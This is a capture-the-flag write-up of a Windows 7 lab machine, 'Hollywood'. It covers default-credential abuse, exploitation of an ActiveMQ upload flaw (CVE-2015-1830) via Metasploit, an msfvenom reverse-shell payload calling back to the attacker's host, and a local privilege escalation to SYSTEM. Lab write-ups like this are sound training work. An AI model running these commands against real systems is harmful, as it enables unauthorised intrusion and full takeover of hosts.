# Hollywood Has Fallen 
<img width="634" height="334" alt="Screenshot 2026-05-25 085814" src="https://github.com/user-attachments/assets/37bf28f2-ece0-4cbf-8ef5-aa823f2bbe90" />

# Overview
Hollywood is a Windows-based machine that involves service enumeration, default credential abuse, Apache ActiveMQ exploitation, Meterpreter session upgrading, and Windows privilege escalation to gain `NT AUTHORITY\SYSTEM`.

This machine demonstrates a complete attack chain involving:

- Service Enumeration
- Default Credential Abuse
- Web Exploitation
- Remote Code Execution (RCE)
- Meterpreter Session Upgrading
- Windows Privilege Escalation
- Post Exploitation Enumeration

# Machine Information

| Category | Details |
|---|---|
| Name | Hollywood |
| OS | Windows 7 Ultimate |
| IP Address | 10.150.150.219 |

# Tools Used 🛠️
- Nmap
- Metasploit Framework
- Meterpreter
- Searchsploit
- Firefox
- Windows CMD

---

# Initial Enumeration 

## Nmap Scan

```bash
nmap -sC -sV -T4 10.150.150.219
```
<img width="819" height="786" alt="Screenshot 2026-05-24 203747" src="https://github.com/user-attachments/assets/bca09d26-e240-4f5e-9995-d90b064f8bc6" />
<img width="816" height="773" alt="Screenshot 2026-05-24 203833" src="https://github.com/user-attachments/assets/f666ff13-9164-4b91-b35d-a6c23c43d6f1" />

# Finger Enumeration 

The Finger service revealed a valid user account:

```text
Login: Admin
Name: Mail System Administrator
```


# POP3 Password Service Abuse 

Port `106` exposed the Mercury/32 password service (`poppassd`).

Connected using Netcat:

```bash
nc -nv 10.150.150.219 106
```

The `Admin` account accepted a blank password:

```text
USER Admin
PASS
200 OK, 'Admin' logged in.
```

Password changed successfully:

```text
NEWPASS test
```

Valid credentials obtained:

```text
Admin:test
```


---

# FLAG30 Discovery 

Browsing the XAMPP dashboard and viewing the source of a non-existent page revealed `FLAG30`.

Example:

```text
view-source:http://10.150.150.219/dashboard/test
```
<img width="1644" height="784" alt="image" src="https://github.com/user-attachments/assets/bdecd94e-c148-437f-90c5-36652c00b8b4" />

---
# ActiveMQ Enumeration 
Apache ActiveMQ was running on port `8161`.
Default credentials worked immediately:

```text
admin : admin
```

After logging into the ActiveMQ administration console, `FLAG33` was discovered on the dashboard.
<img width="1647" height="683" alt="image" src="https://github.com/user-attachments/assets/bcff9708-b2ea-495f-91a6-7339067d8b29" />

## ActiveMQ Login

# Vulnerability Identification 

Nmap revealed:

```text
Apache ActiveMQ 5.10.1 - 5.11.1
```

Research identified:

```text
CVE-2015-1830
```
A directory traversal vulnerability allowing arbitrary JSP upload and Remote Code Execution.

# Initial Foothold

Metasploit module used:

```text
exploit/multi/http/apache_activemq_upload_jsp
```

## Exploitation

```bash
use exploit/multi/http/apache_activemq_upload_jsp
set RHOSTS 10.150.150.219
set LHOST 10.66.66.86
exploit
```

A Java Meterpreter session was obtained successfully.
<img width="816" height="598" alt="Screenshot 2026-05-24 205129" src="https://github.com/user-attachments/assets/0b17ebbf-2acb-43ef-917b-777352c72c25" />

<img width="815" height="728" alt="Screenshot 2026-05-24 205455" src="https://github.com/user-attachments/assets/6b86bae1-65a5-4f94-bd42-2d560ff19b46" />
<img width="812" height="640" alt="Screenshot 2026-05-24 210119" src="https://github.com/user-attachments/assets/e7541c98-24ee-457e-bdbb-450992e8c78d" />

---

# Meterpreter Upgrade

The Java Meterpreter session lacked several required Windows API capabilities.

A native Windows Meterpreter payload was generated:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.66.66.86 LPORT=7777 -f exe > shell.exe
```

The payload was uploaded and executed on the target system.

A native Meterpreter session was successfully established.
<img width="814" height="717" alt="Screenshot 2026-05-24 211544" src="https://github.com/user-attachments/assets/1fae895f-2644-4257-a9b5-c414501c8118" />

---

# Privilege Escalation

The local exploit suggester identified multiple privilege escalation vectors.

Successful exploit:

```text
exploit/windows/local/ntusermndragover
```

## Exploitation

```bash
use exploit/windows/local/ntusermndragover
set SESSION 2
set LHOST 10.66.66.86
run
```

Successful SYSTEM shell:

```text
NT AUTHORITY\SYSTEM
```
<img width="801" height="450" alt="Screenshot 2026-05-25 072945" src="https://github.com/user-attachments/assets/180d74c5-36bc-4bdc-b88c-818d748023d3" />
<img width="811" height="444" alt="Screenshot 2026-05-25 075506" src="https://github.com/user-attachments/assets/b1c6fa02-b207-4257-aa0a-aebf8761625d" />

---

# FLAG9 Discovery 

After obtaining SYSTEM privileges, the final flag was found at:

```text
C:\Users\User\Documents\FLAG9.txt
```
<img width="806" height="306" alt="Screenshot 2026-05-25 075827" src="https://github.com/user-attachments/assets/05ba6381-4d30-44bc-a4e6-54a34b5ef0c9" />


---

# Post Exploitation 
---

# Flags Captured 

| Flag | Description |
|---|---|
| FLAG9 | Found after SYSTEM access |
| FLAG30 | Hidden in XAMPP source page |
| FLAG33 | ActiveMQ dashboard |

---

# Attack Path Summary 

1. Enumerated exposed services
2. Identified ActiveMQ service
3. Tested default credentials
4. Exploited CVE-2015-1830
5. Obtained Java Meterpreter shell
6. Upgraded to native Meterpreter
7. Enumerated local privilege escalation vectors
8. Exploited `ntusermndragover`
9. Achieved `NT AUTHORITY\SYSTEM`
10. Retrieved all challenge flags

---

# Lessons Learned 📚

- Default credentials remain extremely dangerous
- Service enumeration reveals valuable attack paths
- ActiveMQ misconfigurations can lead to RCE
- Java Meterpreter sessions may require upgrading
- Windows 7 systems remain highly vulnerable to privilege escalation exploits

---

# Hollywood Has Fallen 🎬🔥

Compromised by **Paradise** on **25 May 2026**
